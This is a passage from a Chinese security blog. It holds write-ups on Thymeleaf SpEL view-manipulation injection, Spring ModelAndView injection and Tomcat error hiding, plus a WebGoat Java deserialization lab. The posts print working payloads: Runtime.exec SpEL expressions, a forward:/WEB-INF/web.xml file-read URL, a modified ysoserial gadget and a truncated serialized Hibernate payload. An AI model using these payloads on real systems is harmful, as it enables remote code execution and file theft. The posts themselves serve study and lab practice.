profit from the expression cache</span></span><br><span class="line">        fragmentExpression = (FragmentExpression) parser.parseExpression(context, <span class="string">"~&#123;"</span> + viewTemplateName + <span class="string">"&#125;"</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> TemplateProcessingException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Invalid template name specification: '"</span> + viewTemplateName + <span class="string">"'"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>parser.parseExpression</code>方法，在<a href="https://github.com/thymeleaf/thymeleaf/blob/thymeleaf-3.0.11.RELEASE/src/main/java/org/thymeleaf/standard/expression/StandardExpressionParser.java#L113" target="_blank" rel="noopener">StandardExpressionParser</a>中对<code>~{viewTemplateName}~</code>进行处理</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> String preprocessedInput =</span><br><span class="line">    (preprocess? StandardExpressionPreprocessor.preprocess(context, input) : input);</span><br></pre></td></tr></table></figure>

<p>继续跟进<code>StandardExpressionPreprocessor.preprocess</code>，在<a href="https://github.com/thymeleaf/thymeleaf/blob/thymeleaf-3.0.11.RELEASE/src/main/java/org/thymeleaf/standard/expression/StandardExpressionPreprocessor.java#L80" target="_blank" rel="noopener">StandardExpressionPreprocessor</a>中，使用正则表达式将路径中的表达式提取出来。其中正则规则：<code>\_\_(.*?)\_\_</code>（表示非贪婪匹配两个<code>__</code>之间的内容），匹配得到<code>${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;id&quot;).getInputStream()).next()}</code></p>
<p><img src="/2020/09/05/Spring_Thymeleaf_View_%20Manipulation/debug-preprocess.png" alt="debug-preprocess"></p>
<p>提取表达式之后就是根据框架进行对应的表达式解析，这里是Spring所以用的就是SpringEL表达式解析。</p>
<br>

<br>

<p>另一种情况，方法返回类型为<code>void</code>（必须为void），此时才会从URI中获取viewname。这种情况比较隐蔽，代码审计时容易忽略。表达式的解析过程是和上面一模一样。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span>(<span class="string">"/doc/&#123;document&#125;"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getDocument</span><span class="params">(@PathVariable String document)</span> </span>&#123;</span><br><span class="line">    log.info(<span class="string">"Retrieving "</span> + document);</span><br><span class="line">    <span class="comment">//returns void, so view name is taken from URI</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>作者给出的payload: <code>__${T(java.lang.Runtime).getRuntime().exec(&quot;touch executed&quot;)}__::.x</code></p>
<p>和之前的payload相比，少了<code>java.util.Scanner</code>，直接进行命令执行，无回显。</p>
<p>我在这里试了一下回显的payload，发现报错中没有<code>id</code>的执行结果</p>
<p><img src="/2020/09/05/Spring_Thymeleaf_View_%20Manipulation/doc-request.png" alt="doc-request"></p>
<p>动态调试分析，原因是Spring分配URI时会自动抹去后缀名，导致缺少了<code>.x</code>，无法正常回显。再加一个<code>.x</code>就能正常回显。若一个<code>.x</code>都不加，payload会被截成<code>__${T(java.lang.Runtime).getRuntime()</code>，导致命令执行失败。</p>
<p><img src="/2020/09/05/Spring_Thymeleaf_View_%20Manipulation/doc-request2.png" alt="doc-request2"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个漏洞原理很简单，就是Thymeleaf的视图参数可进行表达式解析，若用户输入可控制视图参数，就会导致SpEL注入漏洞产生。</p>
<p>漏洞细节点是payload的构造，需要添加<code>__</code>和<code>::</code>引导表达式解析。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/veracode-research/spring-view-manipulation" target="_blank" rel="noopener">https://github.com/veracode-research/spring-view-manipulation</a></p>
<p><a href="http://itmyhome.com/spring/expressions.html#expressions-types" target="_blank" rel="noopener">http://itmyhome.com/spring/expressions.html#expressions-types</a></p>
]]></content>
  </entry>
  <entry>
    <title>Spring ModelAndView 注入</title>
    <url>/2020/06/13/Spring_ModelAndView_Injection/</url>
    <content><![CDATA[<h1 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1. 介绍"></a>1. 介绍</h1><p>在代码审计时发现以下功能点，Checkmarx显示存在<code>Spring ModelView Injection</code>，是由<code>ModelAndView</code>中的参数可被用户控制导致。这个漏洞的历史还是比较久的，但之前没有碰到过，于是就自己搭建环境调试一番，动手学习一下利用方法。</p>
<a id="more"></a>

<p>源码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/menuitem"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> ModelAndView <span class="title">menuitem</span><span class="params">(HttpServletRequest req, HttpServletResponse req)</span> </span>&#123;</span><br><span class="line">	String url = <span class="keyword">this</span>.getParam(req, <span class="string">"url"</span>);</span><br><span class="line">	HttpSession session = req.getSession();</span><br><span class="line">	session.setAttribute(<span class="string">"menuitem.url"</span>,url);</span><br><span class="line">	String nextUrl = <span class="string">"xxx"</span> + url;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">new</span> ModelAndView(<span class="keyword">new</span> RedirectView(nextUrl));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="2-实践"><a href="#2-实践" class="headerlink" title="2. 实践"></a>2. 实践</h1><p>首先自己搭建一下测试环境，在本地用此代码Demo进行漏洞验证，Springframework版本为<code>5.0.0.RELEASE</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ModelAndViewTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@GetMapping</span>(<span class="string">"/menuitem"</span>)</span><br><span class="line">	<span class="function"><span class="keyword">public</span> ModelAndView <span class="title">menuitem</span><span class="params">(@RequestParam(value = <span class="string">"url"</span>)</span>String url) </span>&#123;</span><br><span class="line">		String nextUrl = url;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> ModelAndView(nextUrl);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><code>ModelAndView</code>是Spring中的一个模型视图对象，作用是设置跳转的视图地址或把controller方法中处理的数据传到jsp页面。</p>
<p><code>ModelAndView</code>有两种使用形式：</p>
<ol>
<li>forward:/view</li>
<li>redirect:/view</li>
</ol>
<p>若<code>ModelAndView(view)</code>中的<code>view</code>参数可被用户控制，可能导致文件被读取的问题。</p>
<p>若直接访问 <a href="http://localhost:8089/WEB-INF/web.xml" target="_blank" rel="noopener">http://localhost:8089/WEB-INF/web.xml</a> ，返回404</p>
<p><img src="/2020/06/13/Spring_ModelAndView_Injection/request_web_xml.png" alt="request_web.xml"></p>
<p>而使用<code>ModelAndView</code>注入，访问 <a href="http://localhost:8089/menuitem?url=forward:/WEB-INF/web.xml" target="_blank" rel="noopener">http://localhost:8089/menuitem?url=forward:/WEB-INF/web.xml</a> ，就可以看到<code>web.xml</code>的内容</p>
<p><img src="/2020/06/13/Spring_ModelAndView_Injection/forward_web_xml.png" alt="forward_web.xml"></p>
<p>但是仅能读取web目录下的文件，不能读取系统其他文件。尝试读取web目录外的文件时产生如下报错：<code>Check that the corresponding file exists within your web application archive!</code></p>
<p><img src="/2020/06/13/Spring_ModelAndView_Injection/500_error.png" alt="500_error"></p>
<p>除了文件读取，当然也能进行一些权限认证的绕过，这需要考虑具体的代码场景，不一定通用。</p>
<p>不过实际项目代码中多了<code>RedirectView()</code>方法变成以下情形：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ModelAndViewTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@GetMapping</span>(<span class="string">"/menuitem"</span>)</span><br><span class="line">	<span class="function"><span class="keyword">public</span> ModelAndView <span class="title">menuitem</span><span class="params">(@RequestParam(value = <span class="string">"url"</span>)</span>String url) </span>&#123;</span><br><span class="line">		String nextUrl = url;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> ModelAndView(<span class="keyword">new</span> RedirectView(url));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><code>RedirectView</code>会触发302跳转的结果，等效于使用<code>url=redirect:/WEB-INF/web.xml</code></p>
<p><img src="/2020/06/13/Spring_ModelAndView_Injection/redirectview_web_xml.png" alt="redirectview_web.xml"></p>
<p>虽然存在<code>RedirectView</code>不能直接读取文件，但能利用302跳转这一特性，实现URL重定向</p>
<p><img src="/2020/06/13/Spring_ModelAndView_Injection/open_redirect.png" alt="open_redirect"></p>
<p>302跳转处回显了我们的输入，那么能进行CRLF注入吗？</p>
<p>答案是不能，Spring会将\r\n进行处理，转换成空格。在下图的请求中可以看到<code>%0d</code>和<code>%0a</code>被转换成<code>\x20</code></p>
<p><img src="/2020/06/13/Spring_ModelAndView_Injection/redirect_crlf.png" alt="CRLF"></p>
<h1 id="3-分析"><a href="#3-分析" class="headerlink" title="3. 分析"></a>3. 分析</h1><p><code>/spring-framework/spring-webmvc/src/main/java/org/springframework/web/servlet/view/UrlBasedViewResolver.java:468</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> View <span class="title">createView</span><span class="params">(String viewName, Locale locale)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	<span class="comment">// If this resolver is not supposed to handle the given view,</span></span><br><span class="line">	<span class="comment">// return null to pass on to the next resolver in the chain.</span></span><br><span class="line">	<span class="keyword">if</span> (!canHandle(viewName, locale)) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// Check for special "redirect:" prefix.</span></span><br><span class="line">	<span class="keyword">if</span> (viewName.startsWith(REDIRECT_URL_PREFIX)) &#123;</span><br><span class="line">		String redirectUrl = viewName.substring(REDIRECT_URL_PREFIX.length());</span><br><span class="line">		RedirectView view = <span class="keyword">new</span> RedirectView(redirectUrl,</span><br><span class="line">			isRedirectContextRelative(), isRedirectHttp10Compatible());</span><br><span class="line">		String[] hosts = getRedirectHosts();</span><br><span class="line">		<span class="keyword">if</span> (hosts != <span class="keyword">null</span>) &#123;</span><br><span class="line">			view.setHosts(hosts);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> applyLifecycleMethods(REDIRECT_URL_PREFIX, view);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// Check for special "forward:" prefix.</span></span><br><span class="line">	<span class="keyword">if</span> (viewName.startsWith(FORWARD_URL_PREFIX)) &#123;</span><br><span class="line">		String forwardUrl = viewName.substring(FORWARD_URL_PREFIX.length());</span><br><span class="line">		InternalResourceView view = <span class="keyword">new</span> InternalResourceView(forwardUrl);</span><br><span class="line">		<span class="keyword">return</span> applyLifecycleMethods(FORWARD_URL_PREFIX, view);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// Else fall back to superclass implementation: calling loadView.</span></span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">super</span>.createView(viewName, locale);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从代码中可以看到，存在三种<code>viewName</code>的处理方法：</p>
<ol>
<li>以<code>redirect:</code>为前缀</li>
<li>以<code>forward:</code>为前缀</li>
<li>没有前缀</li>
</ol>
<h2 id="3-1-以redirect为前缀"><a href="#3-1-以redirect为前缀" class="headerlink" title="3.1 以redirect为前缀"></a>3.1 以redirect为前缀</h2><p>新建一个<code>RedirectView</code>对象，表现结果是根据视图名进行302跳转，返回包中的<code>Location</code>头为<code>redirectUrl</code>变量。</p>
<p><img src="/2020/06/13/Spring_ModelAndView_Injection/redirect_web_xml.png" alt="redirect_web.xml"></p>
<h2 id="3-2-以forward为前缀"><a href="#3-2-以forward为前缀" class="headerlink" title="3.2 以forward为前缀"></a>3.2 以forward为前缀</h2><p>新建一个<code>InternalResourceView</code>对象，根据视图名到指定的位置获取视图模板</p>
<p>在spring的配置文件中，会存在如下的视图解析器配置</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.web.servlet.view.InternalResourceViewResolver"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"prefix"</span> <span class="attr">value</span>=<span class="string">"/"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>InternalResourceView</code>对象会受到该视图解析器配置的影响。</p>
<p><code>InternalResourceViewResolver</code>会把返回的视图名称都解析为<code>InternalResourceView</code>对象，<code>InternalResourceView</code>会把Controller处理器方法返回的模型属性都存放到对应的<code>request</code>属性中，然后通过<code>RequestDispatcher</code>在服务器端把请求forword重定向到目标URL。比如在<code>InternalResourceViewResolver</code>中定义了<code>prefix=/WEB-INF/</code>，<code>suffix=.jsp</code>，然后请求的Controller处理器方法返回的视图名称为<code>test</code>，那么这个时候<code>InternalResourceViewResolver</code>就会把<code>test</code>解析为一个<code>InternalResourceView</code>对象，先把返回的模型属性都存放到对应的<code>HttpServletRequest</code>属性中，然后利用<code>RequestDispatcher</code>在服务器端把请求forword到<code>/WEB-INF/test.jsp</code>。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.web.servlet.view.InternalResourceViewResolver"</span>&gt;</span>  </span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"prefix"</span> <span class="attr">value</span>=<span class="string">"/WEB-INF/"</span>/&gt;</span>  </span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"suffix"</span> <span class="attr">value</span>=<span class="string">".jsp"</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p><code>/spring-framework/spring-webmvc/src/main/java/org/springframework/web/servlet/view/UrlBasedViewResolver.java:549</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> AbstractUrlBasedView <span class="title">buildView</span><span class="params">(String viewName)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	Class&lt;?&gt; viewClass = getViewClass();</span><br><span class="line">	Assert.state(viewClass != <span class="keyword">null</span>, <span class="string">"No view class"</span>);</span><br><span class="line"></span><br><span class="line">	AbstractUrlBasedView view = (AbstractUrlBasedView) BeanUtils.instantiateClass(viewClass);</span><br><span class="line">	view.setUrl(getPrefix() + viewName + getSuffix());</span><br><span class="line">	view.setAttributesMap(getAttributesMap());</span><br><span class="line"></span><br><span class="line">	...</span><br></pre></td></tr></table></figure>

<p><code>view.setUrl(getPrefix() + viewName + getSuffix())</code>会将前缀后缀拼接到<code>view</code>中，会导致可访问的文件有限（此时的前缀后缀是配置文件中的<code>prefix</code>和<code>suffix</code>，不是传入时的<code>forward:</code>）。</p>
<h2 id="3-3-没有前缀"><a href="#3-3-没有前缀" class="headerlink" title="3.3 没有前缀"></a>3.3 没有前缀</h2><p>则调用<code>super.createView()</code>方法，等效于用户直接访问<code>viewName</code>。</p>
<p><code>/spring-framework/spring-webmvc/src/main/java/org/springframework/web/servlet/view/AbstractCachingViewResolver.java:274</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> View <span class="title">createView</span><span class="params">(String viewName, Locale locale)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> loadView(viewName, locale);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h1><p><code>Spring ModelView Injection</code>有以下几种利用方式：</p>
<ol>
<li>web目录下的文件读取，但存在一定的限制（<code>InternalResourceViewResolver</code>中前后缀的配置）</li>
<li>权限认证绕过</li>
<li>重定向</li>
</ol>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://o2platform.files.wordpress.com/2011/07/ounce_springframework_vulnerabilities.pdf" target="_blank" rel="noopener">https://o2platform.files.wordpress.com/2011/07/ounce_springframework_vulnerabilities.pdf</a></p>
<p><a href="http://johnis.online/old/2018/09/18/spring-view-injection/" target="_blank" rel="noopener">http://johnis.online/old/2018/09/18/spring-view-injection/</a></p>
]]></content>
  </entry>
  <entry>
    <title>Tomcat 8.5版本以上隐藏400报错信息</title>
    <url>/2019/12/26/Tomcat8.5+_400_hide/</url>
    <content><![CDATA[<p>一个平时没注意过的问题。</p>
<p>从Tomcat 8.5版本开始，若URL中存在部分特殊字符，会产生400报错。本以为修复方法和其他404、5XX报错页面没什么不同，结果并不简单。因为这个400报错是由于Tomcat无法解析字符导致的报错，并不通过代码层面，所以一般的错误页面自定义配置就会失效。</p>
<a id="more"></a>

<h1 id="隐藏Tomcat-400报错"><a href="#隐藏Tomcat-400报错" class="headerlink" title="隐藏Tomcat 400报错"></a>隐藏Tomcat 400报错</h1><p>报错如下图所示：</p>
<img src="/2019/12/26/Tomcat8.5+_400_hide/400-error.png" alt="400-error">

<p>查看Tomcat文档 <a href="https://tomcat.apache.org/tomcat-8.5-doc/config/http.html" target="_blank" rel="noopener">https://tomcat.apache.org/tomcat-8.5-doc/config/http.html</a> ，其中<code>relaxedPathChars</code>和<code>relaxedQueryChars</code>中写明，若存在<code>&quot; &lt; &gt; [ \ ] ^ ` { | }</code>符号，Tomcat无法解析URI，产生报错。</p>
<p>所以必须采用其他方法进行修复，这里提供隐藏报错详细信息的修复方式。</p>
<p>在<code>server.xml</code>中添加一个<code>ErrorReportValve</code>，将<code>showReport</code>设置为<code>false</code>就隐藏了详细报错信息，<code>showServerInfo</code>设置为<code>false</code>是隐藏Tomcat版本信息。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Valve className&#x3D;&quot;org.apache.catalina.valves.ErrorReportValve&quot;</span><br><span class="line">                   showReport&#x3D;&quot;false&quot;</span><br><span class="line">                   showServerInfo&#x3D;&quot;false&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>



<img src="/2019/12/26/Tomcat8.5+_400_hide/ErrorReportValve.png" alt="ErrorReportValve">



<p>重启Tomcat，再次访问效果如下：</p>
<img src="/2019/12/26/Tomcat8.5+_400_hide/hide-400-error.png" alt="hide-400-error">

<p>虽然没有彻底自定义界面，但好歹也隐藏掉了报错信息。</p>
<h1 id="附加"><a href="#附加" class="headerlink" title="附加"></a>附加</h1><p>本地快速复现漏洞，得善用docker。通过docker可以快速构造好需要的环境，可能节省很多亲自搭建环境的时间，如果让我自己来搭的话指不定要多久，说不定还会碰到各种环境不兼容的问题，有现成的直接用就非常爽了。比如这里我需要tomcat 9，直接在dockerhub上搜索tomcat9，然后随便点击进一个项目。</p>
<p><img src="/2019/12/26/Tomcat8.5+_400_hide/docker-search.png" alt="docker-search"></p>
<p>复制Docker Pull Command，在命令行中输入，即可把镜像拉下来</p>
<p><img src="/2019/12/26/Tomcat8.5+_400_hide/docker-search-2.png" alt="docker-search-2"></p>
<p>镜像拉下来后，启动镜像</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -it --rm -p 8888:8080 donglsheng&#x2F;tomcat9_jdk8</span><br></pre></td></tr></table></figure>

<p>其中，<code>-t</code> 选项让Docker分配一个伪终端（pseudo-tty）并绑定到容器的标准输入上， <code>-i</code> 则让容器的标准输入保持打开，<code>--rm</code>是在运行完成之后清除容器，<code>-p</code>是指定映射端口，其中8888是容器外端口，8080是容器内端口。</p>
<p><img src="/2019/12/26/Tomcat8.5+_400_hide/docker-run.png" alt="docker-run"></p>
<p>这样启动并不能得到一个交互式的shell，如果需要执行容器内命令，在后方加上<code>/bin/bash</code>就是进入容器内的shell。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -it --rm -p 8888:8080 donglsheng&#x2F;tomcat9_jdk8 &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>



<p><del>进入docker后，可能找不到相关的路径，这时需要去查找该镜像的制作人在Docker Hub中有没有写明路径或相关教程。没有的话再看容器启动时是否会显示路径。</del></p>
<p>Dockerfile中都会写明具体路径</p>
<p><img src="/2019/12/26/Tomcat8.5+_400_hide/dockerfile-path.png" alt="dockerfile-path"></p>
<p>进入shell后查找该路径即可找到tomcat的位置。</p>
<p><img src="/2019/12/26/Tomcat8.5+_400_hide/exec-docker.png" alt="exec-docker"></p>
<p><code>cd /usr/local/soft/tomcat/</code>就到了tomcat目录，其中<code>conf</code>目录就是配置文件所在的目录，需要更改的<code>server.xml</code>就在该路径下</p>
<p><img src="/2019/12/26/Tomcat8.5+_400_hide/tomcat-conf-path.png" alt="tomcat-conf-path"></p>
]]></content>
  </entry>
  <entry>
    <title>WebGoat - 不安全的反序列化</title>
    <url>/2019/09/28/WebGoat-Deserialization/</url>
    <content><![CDATA[<p>Webgoat有一道不安全反序列化的题，如下：</p>
<p><img src="/2019/09/28/WebGoat-Deserialization/webgoat-insecure-deserialization.png" alt="webgoat-insecure-deserialization.png"></p>
<p>最初看到这题有点迷茫，不知道该怎么下手，正是迷茫才能从中学到反序列。从网上找了一些文章，自己也动手完全整了一遍，在此记录。<a id="more"></a>（网上特别详细的文章也没有，所以很多坑都是一步一个脚印踩上去的）</p>
<p>最早的一篇讲解Webgoat反序列化的文章</p>
<p><a href="https://medium.com/abn-amro-red-team/java-deserialization-from-discovery-to-reverse-shell-on-limited-environments-2e7b4e14fbef" target="_blank" rel="noopener">https://medium.com/abn-amro-red-team/java-deserialization-from-discovery-to-reverse-shell-on-limited-environments-2e7b4e14fbef</a></p>
<p>上一篇文章的中文翻译，其中有部分作者的改动</p>
<p><a href="https://blog.spoock.com/2018/10/31/reverse-shell-on-limited-environments/" target="_blank" rel="noopener">https://blog.spoock.com/2018/10/31/reverse-shell-on-limited-environments/</a></p>
<p>另一篇文章</p>
<p><a href="https://www.jianshu.com/p/0c45058e1723" target="_blank" rel="noopener">https://www.jianshu.com/p/0c45058e1723</a></p>
<h2 id="正文开始"><a href="#正文开始" class="headerlink" title="正文开始"></a>正文开始</h2><p>安装Burp插件Java Deserialization Scanner，被动扫描发现存在不安全反序列化漏洞</p>
<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-detect.png" alt="deserialization-detect"></p>
<p>将请求Send request to DS - Manual testing 进行测试，发现存在Hibernate 5类型的反序列化</p>
<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-manual-testing.png" alt="deserialization-manual-testing"></p>
<p>然后将请求Send request to DS - Exploitation</p>
<p>坑点一：使用原始的ysoserial.jar执行会报错，需要重新编译ysoserial</p>
<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-exploiting.png" alt="deserialization-exploiting"></p>
<p>详细报错信息如下所示</p>
<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-error.png" alt="deserialization-error"></p>
<p>在GitHub项目里下载源码，无需修改（因为源码里面已经添加了，但是作者并没有将它打包放在releases里）。GitHub地址：<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></p>
<p><code>mvn clean package -DskipTests -Dhibernate5</code>即可构建代码（亲测不加-Dhibernate5不行)</p>
<p>在插件中配置好构建完成的jar包路径，即可正常执行反序列化payload。</p>
<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-exploiting-2.png" alt="deserialization-exploiting-2"></p>
<p>坑点二：Mac下该Java 版本执行ysoserial.jar会提示</p>
<blockquote>
<p>com.nqzero.permit.Permit$InitializationFailed: initialization failed, perhaps you’re running with a security manager</p>
</blockquote>
<p><img src="/2019/09/28/WebGoat-Deserialization/java-version.png" alt="java-version"></p>
<p><img src="/2019/09/28/WebGoat-Deserialization/ysoserial-hibernate-error.png" alt="ysoserial-hibernate-error"></p>
<p>需要在pom.xml中将nqzero版本改为0.4（原始为0.3），重新使用maven构建即可使用。</p>
<p><img src="/2019/09/28/WebGoat-Deserialization/nqzero.png" alt="nqzero.png"></p>
<p>最开始碰到这个问题还以为在Mac下或者是Java版本太高不能用了，于是在Windows下执行，但是Windows执行后不能立马进行base64，还需要将ysoserial的输出保存在文件中，再将文件内容base64编码，觉得太麻烦。这个问题在谷歌中查也查不到解决办法。</p>
<p>在IntelliJ IDEA中查看pom.xml文件时发现存在com.nqzero这个包，报错信息也是com.nqzero.permit.Permit$InitializationFailed，于是想着会不会是这个包版本不对，在maven库中一查，果然最新是0.4版本的，于是换成0.4后使用maven构建后可正常使用。</p>
<p>构建时发现Java版本为1.6，我的maven没法构建，将Java版本改为1.7或者1.8即可正常构建。</p>
<p>坑点三：在Linux中，ysoserial的反序列化无法使用sleep命令，其他命令能执行，这不知道为什么，但是在其他人文章中发现windows下的sleep能执行。目前没有发现任何解决办法，这个稍后动态调试一下看看到底是什么问题导致的。</p>
<p><em>PS：但是Deserialization Scanner中的payload是sleep十秒的，目前不清楚是怎么实现的。</em></p>
<p><strong>请求在执行sleep后并未等待命令结束就已经返回结果</strong>，若要等待进程结束后返回，需要针对ysoserial的执行命令进行调整，重新生成payload进行测试。</p>
<p>在ysoserial/payloads/util/Gadgets.java:117-119，将代码做以下修改，可实现sleep等待5秒</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">String cmd = <span class="string">"java.lang.Process p=java.lang.Runtime.getRuntime().exec(\\"</span><span class="string">" +</span></span><br><span class="line"><span class="string">            command.replaceAll("</span>\\\\\\\\",<span class="string">"\\\\\\\\\\\\\\\\"</span>).replaceAll(<span class="string">"\\"</span><span class="string">", "</span>\\\\\\"<span class="string">") +</span></span><br><span class="line"><span class="string">            "</span>\\");p.waitFor();<span class="string">";</span></span><br></pre></td></tr></table></figure>

<p>最终效果图如下：</p>
<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-exploiting-success.png" alt="deserialization-exploiting-success"></p>
<p><img src="/2019/09/28/WebGoat-Deserialization/webgoat-insecure-deserialization-complete.png" alt="webgoat-insecure-deserialization-complete"></p>
<p>payload也贴一下吧</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAI29yZy5oaWJlcm5hdGUuZW5naW5lLnNwaS5UeXBlZFZhbHVlh4gUshmh5zwCAAJMAAR0eXBldAAZTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlO0wABXZhbHVldAASTGphdmEvbGFuZy9PYmplY3Q7eHBzcgAgb3JnLmhpYmVybmF0ZS50eXBlLkNvbXBvbmVudFR5cGV-e2Nh9AnXEQIADVoAEmhhc05vdE51bGxQcm9wZXJ0eVoABWlzS2V5SQAMcHJvcGVydHlTcGFuTAAPY2FuRG9FeHRyYWN0aW9udAATTGphdmEvbGFuZy9Cb29sZWFuO1sAB2Nhc2NhZGV0AChbTG9yZy9oaWJlcm5hdGUvZW5naW5lL3NwaS9DYXNjYWRlU3R5bGU7TAARY29tcG9uZW50VHVwbGl6ZXJ0ADFMb3JnL2hpYmVybmF0ZS90dXBsZS9jb21wb25lbnQvQ29tcG9uZW50VHVwbGl6ZXI7TAAKZW50aXR5TW9kZXQAGkxvcmcvaGliZXJuYXRlL0VudGl0eU1vZGU7WwALam9pbmVkRmV0Y2h0ABpbTG9yZy9oaWJlcm5hdGUvRmV0Y2hNb2RlO1sADXByb3BlcnR5TmFtZXN0ABNbTGphdmEvbGFuZy9TdHJpbmc7WwATcHJvcGVydHlOdWxsYWJpbGl0eXQAAltaWwANcHJvcGVydHlUeXBlc3QAGltMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGU7WwAhcHJvcGVydHlWYWx1ZUdlbmVyYXRpb25TdHJhdGVnaWVzdAAmW0xvcmcvaGliZXJuYXRlL3R1cGxlL1ZhbHVlR2VuZXJhdGlvbjtMAAl0eXBlU2NvcGV0ACpMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGVGYWN0b3J5JFR5cGVTY29wZTt4cgAfb3JnLmhpYmVybmF0ZS50eXBlLkFic3RyYWN0VHlwZYdFsKQmRS24AgAAeHAAAAAAAAFwcHNyADNvcmcuaGliZXJuYXRlLnR1cGxlLmNvbXBvbmVudC5Qb2pvQ29tcG9uZW50VHVwbGl6ZXLAqqGhlZ9DmwIABEwADmNvbXBvbmVudENsYXNzdAARTGphdmEvbGFuZy9DbGFzcztMAAlvcHRpbWl6ZXJ0ADBMb3JnL2hpYmVybmF0ZS9ieXRlY29kZS9zcGkvUmVmbGVjdGlvbk9wdGltaXplcjtMAAxwYXJlbnRHZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxwYXJlbnRTZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cgA3b3JnLmhpYmVybmF0ZS50dXBsZS5jb21wb25lbnQuQWJzdHJhY3RDb21wb25lbnRUdXBsaXplcgh6nmX_Q4R7AgAFWgASaGFzQ